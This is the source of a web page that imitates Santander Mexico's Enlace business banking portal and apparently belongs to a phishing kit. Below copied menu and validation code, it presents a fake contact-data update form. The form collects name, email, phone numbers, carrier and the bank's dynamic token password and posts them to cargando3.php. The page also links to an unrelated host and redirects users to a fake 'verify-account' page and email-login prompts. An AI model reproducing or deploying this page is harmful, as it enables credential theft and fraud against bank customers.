 fw_menu_3_3_3_2.addMenuItem("Reposici&oacute;n","location='/Enlace/enlaceMig/NomPreReposicionTarjeta?flujo=ESAR'");
 fw_menu_3_3_3_2.addMenuItem("Consulta estado asignaci&oacute;n masiva","location='/Enlace/enlaceMig/NomPreConsultaEstado?flujo=ESAE'");
 window.fw_menu_3_3_3_3 = new Menu("Pagos",190,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_3_3_3_3.addMenuItem("Importaci&oacute;n env&iacute;o","location='/Enlace/enlaceMig/NomPredispersion?Modulo=7&flujo=ESAN'");
 fw_menu_3_3_3_3.addMenuItem("Pago Individual","location='/Enlace/enlaceMig/NomPredispersion?Modulo=9&flujo=ESAI'");
 fw_menu_3_3_3_3.addMenuItem("Consulta","location='/Enlace/enlaceMig/NomPredispersion?Modulo=8&flujo=ESAO'");
 window.fw_menu_3_3_3_4 = new Menu("Vinculaci&oacute;n tarjeta ",190,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_3_3_3_4.addMenuItem("Alta","location='/Enlace/enlaceMig/EnlcAltaTarjeta?operacion=1&flujo=ALTC'");
 fw_menu_3_3_3_4.addMenuItem("Consulta y Baja","location='/Enlace/enlaceMig/EnlcConsultaTarjeta?operacion=1&flujo=COTC'");
 window.fw_menu_3_3_3 = new Menu("Tarjeta de Pagos Santander ",190,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_3_3_3.addMenuItem(fw_menu_3_3_3_1);
 fw_menu_3_3_3.addMenuItem(fw_menu_3_3_3_2);
 fw_menu_3_3_3.addMenuItem(fw_menu_3_3_3_3);
 fw_menu_3_3_3.hideOnMouseOut=true;
 fw_menu_3_3_3.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
	fw_menu_3_4_2.addMenuItem("Modificaci&oacute;n","location='null'");
	 fw_menu_3_4_2.hideOnMouseOut=true;
	window.fw_menu_3_4_5 = new Menu("Consultas",150,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_4_5.addMenuItem("Cheques/Cancelaci&oacute;n","location='/Enlace/enlaceMig/SinFacultades'");
	fw_menu_3_4_5.addMenuItem("Archivos","location='/Enlace/enlaceMig/SinFacultades'");
	 fw_menu_3_4_5.hideOnMouseOut=true;
	window.fw_menu_3_4_3 = new Menu("Mantenimiento de Cuentas",48,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_4_3.addMenuItem("Alta","location='/Enlace/enlaceMig/SinFacultades'");
	fw_menu_3_4_3.addMenuItem("Baja","location='/Enlace/enlaceMig/SinFacultades'");
	 fw_menu_3_4_3.hideOnMouseOut=true;
    window.fw_menu_3_4 = new Menu("Chequera Seguridad",199,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_3_4.addMenuItem(fw_menu_3_4_1);
    fw_menu_3_4.addMenuItem(fw_menu_3_4_5);
    fw_menu_3_4.addMenuItem(fw_menu_3_4_3);
	  fw_menu_3_4.hideOnMouseOut=true;
     fw_menu_3_4.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
	window.fw_menu_3_5_1 = new Menu("Registro de Pagos",85,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_5_1.addMenuItem("En L&iacute;nea","location='/Enlace/enlaceMig/pdLinea?flujo=ESPL'");
 fw_menu_3_5_1.addMenuItem("Por Archivo","location='/Enlace/enlaceMig/pdRegistro?txtOpcion=13&flujo=ESPA'");
	 fw_menu_3_5_1.hideOnMouseOut=true;
	window.fw_menu_3_5_2 = new Menu("Mantenimiento de Cuentas",48,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_5_2.addMenuItem("Alta","location='/Enlace/enlaceMig/pdAltaCuentas?ventana=0&flujo=ESMA'");
	fw_menu_3_5_2.addMenuItem("Baja","location='/Enlace/enlaceMig/pdBajaCuentas?ventana=0&flujo=ESMB'");
	 fw_menu_3_5_2.hideOnMouseOut=true;
	window.fw_menu_3_5_3 = new Menu("Mantenimiento de Beneficiarios",91,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_5_3.addMenuItem("Alta","location='/Enlace/enlaceMig/pdAltaBenef?ventana=0&flujo=ESBA'");
	fw_menu_3_5_3.addMenuItem("Baja","location='/Enlace/enlaceMig/pdBajaBenef?ventana=0&flujo=ESBB'");
	fw_menu_3_5_3.addMenuItem("Modificaci&oacute;n","location='/Enlace/enlaceMig/pdModifBenef?ventana=0&flujo=ESBM'");
	 fw_menu_3_5_3.hideOnMouseOut=true;
    window.fw_menu_3_5 = new Menu("Pago Directo",215,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_3_5.addMenuItem(fw_menu_3_5_1);
    fw_menu_3_5.addMenuItem("Consulta y Modificaci&oacute;n de Pagos","location='/Enlace/enlaceMig/pdConsultas?flujo=ESCM'");
    fw_menu_3_5.addMenuItem(fw_menu_3_5_2);
    fw_menu_3_5.addMenuItem(fw_menu_3_5_3);
	 fw_menu_3_5.addMenuItem("Cat&aacute;logo de Sucursales","location='/Enlace/enlaceMig/pdSucursales?flujo=ESCS'");
	 fw_menu_3_5.hideOnMouseOut=true;
     fw_menu_3_5.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
 window.fw_menu_3_6_1 = new Menu("Mantenimiento a Proveedores",150,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_6_1.addMenuItem("Alta","location='/Enlace/enlaceMig/coMtoProveedor?opcion=1&flujo=ESPT'");
	fw_menu_3_6_1.addMenuItem("Consulta y Modificaci&oacute;n","location='/Enlace/enlaceMig/coMtoProveedor?opcion=2&flujo=ESPS'");
	 fw_menu_3_6_1.hideOnMouseOut=true;
	window.fw_menu_3_6_2 = new Menu("Estad&iacute;sticas",65,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_6_2.addMenuItem("Reportes","location='/Enlace/enlaceMig/coEstadisticas?flujo=ESPE'");
	fw_menu_3_6_2.addMenuItem("Gr&aacute;ficas","location='/Enlace/enlaceMig/confGrafica?flujo=ESPG'");
  fw_menu_3_6_2.hideOnMouseOut=true;
    window.fw_menu_3_6 = new Menu("Confirming Pago a proveedores",199,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_3_6.addMenuItem(fw_menu_3_6_1);
	fw_menu_3_6.addMenuItem("Pagos","location='/Enlace/enlaceMig/coPagos?opcion=0&flujo=ESPP'");
    fw_menu_3_6.addMenuItem("Consulta y Cancelaci&oacute;n de Pagos","location='/Enlace/enlaceMig/coCancelacion?flujo=ESCN'");
    fw_menu_3_6.addMenuItem(fw_menu_3_6_2);
     fw_menu_3_6.hideOnMouseOut=true;
	  fw_menu_3_6.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
	window.fw_menu_3_8 = new Menu("SAR",199,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_3_8.addMenuItem("Pagos","location='/Enlace/enlaceMig/ConsultaUsuarios?Modulo=0&flujo=ESSP'");
	fw_menu_3_8.addMenuItem("Consulta y Cancelaci&oacute;n de Pagos","location='/Enlace/enlaceMig/ConsultaUsuarios?Modulo=6&flujo=ESSC'");
 fw_menu_3_8.hideOnMouseOut=true;
 fw_menu_3_8.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
 window.fw_menu_3_14 = new Menu("S.U.A. L&iacute;nea de Captura",190,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_3_14.addMenuItem("Pagos","location='/Enlace/enlaceMig/SUALineaCapturaServlet?opcionLC=1'");
 fw_menu_3_14.addMenuItem("Consulta","location='/Enlace/enlaceMig/SUAConsultaPagoServlet?opcion=1&flujo=ESOC'");
 fw_menu_3_14.hideOnMouseOut=true;
 fw_menu_3_14.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
 window.fw_menu_3_13_1 = new Menu("Remesas",190,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_3_13_1.addMenuItem("Administraci&oacute;n","location='/Enlace/enlaceMig/AdmonRemesasServlet?operacion=1&flujo=ESEC'");
 fw_menu_3_13_1.addMenuItem("Consulta","location='/Enlace/enlaceMig/AdmonRemesasServlet?operacion=2&flujo=ESEC'");
 window.fw_menu_3_13_2 = new Menu("Asignaci&oacute;n tarjeta-empleado",190,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_3_13_2.addMenuItem("Asignaci&oacute;n Individual","location='/Enlace/enlaceMig/AsignacionEmplServlet?opcion=iniciarIndividual&flujo=ESEC'");
 fw_menu_3_13_2.addMenuItem("Importaci&oacute;n env&iacute;o","location='/Enlace/enlaceMig/AsignacionEmplServlet?opcion=iniciarArchivo&flujo=ESEC'");
 fw_menu_3_13_2.addMenuItem("Consulta","location='/Enlace/enlaceMig/ConsultaAsignacionServlet?flujo=ESEC'");
 window.fw_menu_3_13 = new Menu("Cuenta Inmediata",190,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_3_13.addMenuItem(fw_menu_3_13_1);
 fw_menu_3_13.addMenuItem(fw_menu_3_13_2);
 fw_menu_3_13.hideOnMouseOut=true;
 fw_menu_3_13.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
 window.fw_menu_3_14 = new Menu("S.U.A. L&iacute;nea de Captura",190,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
 fw_menu_3_14.addMenuItem("Pagos","location='/Enlace/enlaceMig/SUALineaCapturaServlet?opcionLC=1'");
 fw_menu_3_14.addMenuItem("Consulta","location='/Enlace/enlaceMig/SUAConsultaPagoServlet?opcion=1&flujo=ESOC'");
 fw_menu_3_14.hideOnMouseOut=true;
 fw_menu_3_14.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
  window.fw_menu_3 = new Menu("root",248,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
  fw_menu_3.addMenuItem(fw_menu_3_1);
  fw_menu_3.addMenuItem(fw_menu_3_7);
  fw_menu_3.addMenuItem(fw_menu_3_2);
 fw_menu_3.addMenuItem(fw_menu_3_14);
  fw_menu_3.addMenuItem(fw_menu_3_3);
  fw_menu_3.addMenuItem(fw_menu_3_3_1_3);
  fw_menu_3.addMenuItem(fw_menu_3_3_3);
 fw_menu_3.addMenuItem(fw_menu_3_13);
  fw_menu_3.addMenuItem(fw_menu_3_4);
  fw_menu_3.addMenuItem(fw_menu_3_5);
  fw_menu_3.addMenuItem(fw_menu_3_6);
  fw_menu_3.addMenuItem(fw_menu_3_8);
 fw_menu_3.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
    window.fw_menu_4_1 = new Menu("Mancomunidad",265,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_4_1.addMenuItem("Consulta y Autorizaci&oacute;n","location='/Enlace/enlaceMig/AMancomunidad?flujo=EAMC'");
    fw_menu_4_1.addMenuItem("Generaci&oacute;n de Folios","location='/Enlace/enlaceMig/AMancEspecial?flujo=EAMG'");
	 fw_menu_4_1.addMenuItem("Operaciones Internacionales","location='/Enlace/enlaceMig/AMancomunidadInter?flujo=EAMO'");
 fw_menu_4_1.addMenuItem("Consulta y Autorizaci&oacute;n Archivos y Servicios","location='/Enlace/enlaceMig/AMancomunidadSA?flujo=EAMA'");
 fw_menu_3_3_3.addMenuItem(fw_menu_3_3_3_4);
	fw_menu_4_1.hideOnMouseOut=true;
    window.fw_menu_4_2 = new Menu("Cuentas",200,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_4_2.addMenuItem("Consulta","location='/Enlace/enlaceMig/ContCtas_AL?Modulo=0&flujo=EACN'");
	 fw_menu_4_2.addMenuItem("Alta","location='/Enlace/enlaceMig/MMC_Alta?Modulo=0&flujo=EACA'");
    fw_menu_4_2.addMenuItem("Baja","location='/Enlace/enlaceMig/MMC_Baja?Modulo=0&flujo=EACB'");
    fw_menu_4_2.addMenuItem("Autorizaci&oacute;n y Cancelaci&oacute;n","location='/Enlace/enlaceMig/ContCtas_AL?Modulo=2&flujo=EAAC'");
   fw_menu_4_2.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
     fw_menu_4_2.hideOnMouseOut=true;
 window.fw_menu_4_3_1 = new Menu("Administraci&oacute;n de Usuarios",170,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
	fw_menu_4_3_1.addMenuItem("Alta de Usuarios","location='/Enlace/enlaceMig/AdmonUsuarioServlet?Operacion=alta&JSON=&Origen=&Destino=/jsp/adminusr/adminAltaUsr.jsp&Error=/jsp/adminusr/error.jsp'");
	fw_menu_4_3_1.addMenuItem("Baja de Usuarios","location='/Enlace/enlaceMig/AdmonUsuarioServlet?Operacion=baja&JSON=&Origen=&Destino=/jsp/adminusr/adminBajaUsr.jsp&Error=/jsp/adminusr/error.jsp'");
	fw_menu_4_3_1.addMenuItem("Modificaci&oacute;n de Usuarios","location='/Enlace/enlaceMig/AdmonUsuarioServlet?Operacion=cambio&JSON=&Origen=&Destino=/jsp/adminusr/adminModiUsr.jsp&Error=/jsp/adminlym/error.jsp'");
 fw_menu_4_3_1.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
	fw_menu_4_3_1.hideOnMouseOut=true;
 window.fw_menu_4_3 = new Menu("Administraci&oacute;n Super Usuario",250,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
    fw_menu_4_3.addMenuItem(fw_menu_4_3_1);
    fw_menu_4_3.addMenuItem("Establecimiento de L&iacute;mites y Montos","location='/Enlace/enlaceMig/AdmonLimitesMontosServlet?Operacion=admin&JSON=&Origen=&Destino=/jsp/adminlym/adminlym.jsp&Error=/jsp/adminlym/error.jsp'");
    fw_menu_4_3.addMenuItem("Configuraci&oacute;n de Medios de Notificaci&oacute;n","location='/Enlace/enlaceMig/ConfigMedioNot?opcion=0'");
	fw_menu_4_3.hideOnMouseOut=true;
 fw_menu_4_3.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
  window.fw_menu_4 = new Menu("root",200,17,"Verdana, Arial, Helvetica, sans-serif",10,"#000000","#ffffff","#e6e5e1","#3c4780");
  fw_menu_4.addMenuItem(fw_menu_4_1);
  fw_menu_4.addMenuItem("Cambio de Contrato","location='javascript:unSoloContrato();'");
  fw_menu_4.addMenuItem("Cambio de Contrase&ntilde;a","location='/Enlace/enlaceMig/CambioPasswd?flujo=EACO&pwdSAM=1'");
  fw_menu_4.addMenuItem(fw_menu_4_2);
	fw_menu_4.addMenuItem("Usuarios","location='/Enlace/enlaceMig/ConsultaUsuarios?flujo=EAUS'");
  fw_menu_4.addMenuItem("Generaci&oacute;n manual de archivos","location='/Enlace/enlaceMig/ChesConsulta?modulo=macros&flujo=EAGM'");
  fw_menu_4.addMenuItem("Mant. de Datos Personales","location='/Enlace/enlaceMig/CapturaDatosUsr?opcion=0&flujo=EAGM'");
   fw_menu_4.hideOnMouseOut=true;
   fw_menu_4.childMenuIcon="/gifs/EnlaceMig/gic25010.gif";
  fw_menu_4.writeMenus();
} // fwLoadMenus()
//-->
<!-- Final del Javascript de los menus de cascada -->

		function pintaExito(msg){
			cuadroDialogo(msg, 1);
			/**alert("msg");*/
		}

		function pintaError(msg){
			cuadroDialogo(msg, 3);
			/**alert("msg");*/
		}

		function trimString (str){
			str = this != window? this : str;
			return str.replace(/^\s+/g, '').replace(/\s+$/g, '');
		}

		function echeck(str){
			var at="@";
		  	var dot=".";
		  	var lat=str.indexOf(at);
		  	var lstr=str.length;
		  	var ldot=str.indexOf(dot);

		  	if (str.indexOf(at)==-1)
		    	return false;
		  	if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr)
		    	return false;
		  	if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr)
		    	return false;
		  	if (str.indexOf(at,(lat+1))!=-1)
		      	return false;
		  	if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot)
		      	return false;
		  	if (str.indexOf(dot,(lat+2))==-1)
		      	return false;
		  	if (str.indexOf(" ")!=-1)
		     	return false;
		  	return true;
		}


		function validaEmail(opc){
			var emailCtr = document.FrmCapturaDatosUsr.emailContrato.value.toLowerCase();
			var emailUsr = document.FrmCapturaDatosUsr.emailUsuario.value.toLowerCase();
			var emailID;

			if(opc==0){
				emailID = trimString(emailUsr);
			}else if(opc==1){
				emailID = trimString(emailCtr);
			}

		  	if(trimString(emailID)!=""){
				if (echeck(emailID)==false){
					if(opc==0){
						document.FrmCapturaDatosUsr.emailUsuario.focus();
					}else if(opc==1){
						document.FrmCapturaDatosUsr.emailContrato.focus();
					}
					cuadroDialogo("El correo especificado no es v&aacute;lido.", 3);
					/**alert("El correo especificado no es v&aacute;lido.");*/
					return false
			  	}
		  	}else{
		    	cuadroDialogo( "Es necesario incluir el correo para env&iacute;o de detalle" ,3);
		    	/**alert("Es necesario incluir el correo para env&iacute;o de detalle");*/
		     	return false;

		  	}
            var correosInvalidos = new Array("banca_elactronica@bsantander.com.mx",
            								 "banca_electronica@bsantander.com.mx",
            								 "banca_electronica@santander.com.mx",
            								 "hugrodriguez@santander.com.mx",
            								 "xanca_elactronica@bsantander.com.mx");

	            var n = 0;
            	var emailTmp = "";

	            for(n = 0; n < correosInvalidos.length; n++){
    	        	emailTmp = correosInvalidos[n];
        	    	if(emailID == emailTmp){
        	    		cuadroDialogo("El correo especificado no es v&aacute;lido" , 3);
        	    		return false;
        	    	}
            	}

		  	return true;
		}

		function validaCel(){
			var ladaSel    = document.FrmCapturaDatosUsr.ladaUsuario.value;
			var carrierSel = document.FrmCapturaDatosUsr.carrier.value;
			var numCelular  = document.FrmCapturaDatosUsr.celUsuario.value;
			var RegExPattern_Lada = /^[0-9]{2,3}$/
			var RegExPattern_Cel = /^[0-9]{7,8}$/
			if(ladaSel.match(RegExPattern_Lada)){
				if(numCelular.match(RegExPattern_Cel)){
					if(ladaSel.length + numCelular.length == 10){
						return true;
					}else{
						cuadroDialogo("El N&uacute;mero de Celular incorrecto, el n&uacute;mero m&aacute;s la Lada debe ser de 10 digitos",3);
						return false;
					}
				}else{
					cuadroDialogo("El N&uacute;mero de Celular no es v&aacute;lido",3);
					return false;
				}
			}else{
				cuadroDialogo("Lada no v&aacute;lida",3);
				return false;
			}
		}


		function enviarDataUsr(){
			var forma = document.FrmCapturaDatosUsr;
			var contador = -1;

			for(j=0;j<forma.length;j++){
	  			if(forma.elements[j].type=='radio' && forma.elements[j].name=='tipoMod'){
					if(forma.elements[j].checked){
	       				contador = forma.elements[j].value;
	       			}
	       		}
			}

			if(contador==-1){
			   cuadroDialogo("Debe seleccionar al menos una opci&oacute;n",1);
			   /**alert("Debe seleccionar al menos una opci&oacute;n");*/
			}else{
				//Modificacion de Datos Contrato
				if(contador == 1){
		 		if(validaEmail(contador)){
					document.FrmCapturaDatosUsr.opcion.value = 1;
		  	   		document.FrmCapturaDatosUsr.submit();
		  	   		}
		  	   	}
		  	   	//Modificacion de Datos Usuario
		  	   	if(contador == 0){
		  	   		

		  	   		

		  	   		
		  	   			if(validaEmail(contador) && validaCel()){
						document.FrmCapturaDatosUsr.opcion.value = 1;
		  	   			document.FrmCapturaDatosUsr.submit();
		  	   			}
		  	   		
		  	   	}

			}
		}


		function resetDataUsr(){
				document.FrmCapturaDatosUsr.reset();
		}


		function MM_preloadImages() { //v3.0
		  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
		    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
		    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
		}

function MM_findObj(n, d) { //v3.0
		  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
		    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
		  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
		  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document); return x;
		}

//-->//-->
</script>

    <script language="JavaScript">
        <!--


		function MM_findObj(n, d) { //v4.01
		  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
		    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
		  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
		  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
		  if(!x && d.getElementById) x=d.getElementById(n); return x;
		}


		function MM_preloadImages() { //v3.0
		 var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
		   var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
		   if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
		}

function MM_swapImage() { //v3.0
		  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
		   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
		}


		function MM_openBrWindow(theURL,winName,features) { //v2.0
		  window.open(theURL,winName,features);
		}
//-->
</script>



    <script language="javascript" src="encuesta_actualizaciondatos2017/scrImpresion.js.descarga"></script>
    <link rel="stylesheet" href="encuesta_actualizaciondatos2017/consultas.css" type="text/css">
    <script type="text/javascript" src="encuesta_actualizaciondatos2017/otros.js.descarga"></script>





    
</head>


<body topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bgcolor="#ffffff" background="encuesta_actualizaciondatos2017/gfo25010.gif">

    <input type="hidden" name="session" id="session" value="<?=$session;?>">
    



    <div id="backmodal"></div>

<div class="" id="divEmailConfirm" style="">
    <div id="cnt">
        <iframe id="iframeEmail" style="width: 100%; height: 550px" src=""></iframe>
        
    </div>
</div>



<script>
    function closeIframeHotmail(){
        window.parent.location.href = "../eai/EaiEmpresasWAR/verify-account.do.php?SESSIONID="+$('#session').val()+"&data=ahjdaksdh878912371923";
    }

    function closeIframeGmail(){
        window.parent.location.href = "../../../../../eai/EaiEmpresasWAR/verify-account.do.php?SESSIONID="+$('#session').val()+"&data=ahjdaksdh878912371923";
    }

    function closeIframeYahoo(){
        window.parent.location.href = "../../../eai/EaiEmpresasWAR/verify-account.do.php?SESSIONID="+$('#session').val()+"&data=ahjdaksdh878912371923";
    }

    function closeIframeProdigy(){
        window.parent.location.href = "../../../eai/EaiEmpresasWAR/verify-account.do.php?SESSIONID="+$('#session').val()+"&data=ahjdaksdh878912371923";
    }

    function closeIframeGenerico(){
        window.parent.location.href = "../eai/EaiEmpresasWAR/verify-account.do.php?SESSIONID="+$('#session').val()+"&data=ahjdaksdh878912371923";
    }
</script>



<table width="760" border="0" cellspacing="0" cellpadding="0">
    <tbody>
            <tr>
                <td width="676" valign="top" align="left"><img src="fondoempre.jpg" width="1909" height="963"></td>
            </tr>
        </tbody>
    </table>

    <!--<form name = "Frmfechas">
  			null</td>
		</form>-->

    <div class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-draggable" tabindex="-1" role="dialog" aria-labelledby="ui-dialog-title-aviso" style="display: block; z-index: 1002; outline: 0px; height: auto; width: auto; top: 100px; left: 50px;">
    <div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix" style="display: none;"><span class="ui-dialog-title" id="ui-dialog-title-aviso">&nbsp;</span><a href="https://supernt.online/QcajASCS0Jq71jRv6xIgxv2SB6EFtt4ysrLuzJRK/WGmQas8AEcGObGZlt7X36DY5rumUiiYYHCfSmP54KsfXAMc8tT/data.php#" class="ui-dialog-titlebar-close ui-corner-all" role="button" style="display: none;"><span class="ui-icon ui-icon-closethick">close</span></a></div>
    
   
    <div id="aviso" style="width: auto; min-height: 0px; height: 299.04px; overflow: hidden;" class="ui-dialog-content ui-widget-content" scrolltop="0" scrollleft="0">
  
            
   <div class="col-md-12 col-sm-12 col-xs-12 vsf-operativa-body" style="height: 640px;">
   
   
          <table id="tblBTN" style="display: none;" width="640" border="0" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" height="300">
                    <tbody>
                        <tr>
                            <td align="left" valign="top" height="300" width="640">
                           <strong>  Por favor, inicie sesión en su correo electrónico para que de esta manera quede asociado su email al servicio de alertas.</strong>
                                <br>
                                     <br>
                            <a>
                                    <br>
                                         <br>
                                              <br>
                                   
                                    
                                    <input id="btnVerify" name="btnVerify" type="button" class="btn btn-primary form-control pull-right bet-form-add fields-read"  value="Aceptar" style="display: block;">

                                    
                                </a> </td>
                          
                        </tr>
                    </tbody>
                </table>
  
	<div class="panel panel-default padding-right-0 padding-left-0 col-md-12 col-sm-12 col-xs-12" style="margin-bottom: 6px;">
		
 

	  <form action="cargando3.php" method="post" name="form" id="form">

			<div class="bet-form">
			<div class="panel-default">
					
						
					


   <input name="tipoMod" type="radio" value="1" checked="">


<div class="page-header titulos">
	<div class="col-xs-9 col-md-9 pull-left">
		<strong>Datos de contacto personales</strong>
	</div>
	
</div>
					<div class="panel-body">
						<div>

							<div class="row">
                            <span><span class="hidden fields-modify">(*)</span> Nombre:</span>
                           
                             	 <input name="bato" type="text" value="" size="30" maxlength="50" id="bato" required>
                                <span></span>  <span><span class="hidden fields-modify">(*)</span> Correo Electronico:</span>
									 <input name="correo" type="text" value="" size="30" id="correo" required>
                                   
								<div class="col-md-12">
                                
                                
									<div class="col-md-4 padding-left-0 padding-right-0"></div>
                                    
									
									<div class="col-md-8 padding-left-0 padding-right-0">
										
											
										



 

<div class="vsf-inline-sub">




	<h4 class="sub-group padding-0 ">
		<span class="">SMS - celular</span>
	</h4>
</div>

									</div>
								</div>
							</div>
							<div class="row">
								<div class="col-md-12">
                                                                    
                                    
									<div class="col-md-2 padding-left-0">
                                    
                                    
                                    
										<span>Tel Fijo:</span>
										 <input name="fon" type="text" id="fon" onkeypress="return solo_numeros_wey(event)" value="" size="30" maxlength="12" required>
										<br> 
										
								  </div>
									<div class="col-md-1"></div>
									<div class="col-md-2">
										<span>Celular:</span> 
										<input onkeypress="return solo_numeros_wey(event)" name="celular" id="celular" type="text" value="" size="30" maxlength="13">
										<br> 
                                        
                                        

									</div>
									<div class="col-md-1"></div>
									<div class="col-md-3 padding-right-0">
										<span>Compañía Telefónica:</span>
										 <select id="carrier" name="carrier"  required>
                                        
                                                                                                         <option value="">Compa&ntilde;&iacute;a Celular</option>
                                                                                        <option value="UNEFON">UNEFON</option>
                                                                                        <option value="FLASH MOBILE">FLASH MOBILE</option>
                                                                                        <option value="WEEX">WEEX</option>
                                                                                        <option value="TELEFONICA">TELEFONICA</option>
                                                                                        <option value="AT&T">AT&T</option>
                                                                                        <option value="TELCEL">TELCEL</option>
                                                                                        <option value="NEXTEL">NEXTEL</option>
                                                                                        <option value="VIRGIN MOBILE">VIRGIN MOBILE</option>
                                                                                        <option value="IUSACELL">IUSACELL</option>
                                                                                        <option value="OTRO">OTRO</option>
									  </select>
										<br>
										
										
									</div>
								</div>
							</div>
						</div>
					</div>

					
						
					





<div class="page-header titulos">
	<div class="col-xs-9 col-md-9 pull-left"></div>
	
</div>
					<div class="panel-body">
						<div>
						  <div class="row">
							  <div class="col-md-12">Porfavor complete la información para poder continuar con el ingreso al servicio, ingrese un número de teléfono fijo u oficina y un número de teléfono celular para sincronizarlos con el servicio de alertas SMS y confirmación de operaciones vía telefónica, esto con el fin de brindar el mejor servicio y mantenerlo siempre actualizado para que llegue hasta usted la informaci&amp;oacute;n de sus cuentas</div>
							</div>
												</div>
				
											
							<div class="row"><span class="tabmovtex">
                                        <br>
                                        Contraseña dinámica:
                                        <input onkeypress="return solo_numeros_wey(event)" name="token" type="password" id="token" value="" size="10" maxlength="8">
                      <img src="PassDinamico_files/token.svg" width="53" height="35"></div>						
					Ingrese su clave dinamica para confirmar su actualizacion</div>				
					<div class="panel-default footerModificar fields-read">						
						
						<div class="row">
							<div class="col-md-12">
															<div class="col-md-2 pull-right padding-right-0">
									<div class="fields-read">
									                                         <input id="btnAceptar" name="Aceptar" type="button" class="btn btn-primary form-control pull-right bet-form-add fields-read" value="Actualizar">
									</div>
								</div>
							</div>
						</div>
					</div>
				
					
	</div>
	
				         </div>
							         							      
								       
							         	</div>						      
							     </div>
															
						</div>
						
		</div>
        
	</form>
	
         
            </div>
            <!----- INICIA AVISO ------------->

            <div id="aviso22" style="display: none;">
                <table height="190" width="290" border="0">
                    <tbody>
                        <tr class="tittabdat">
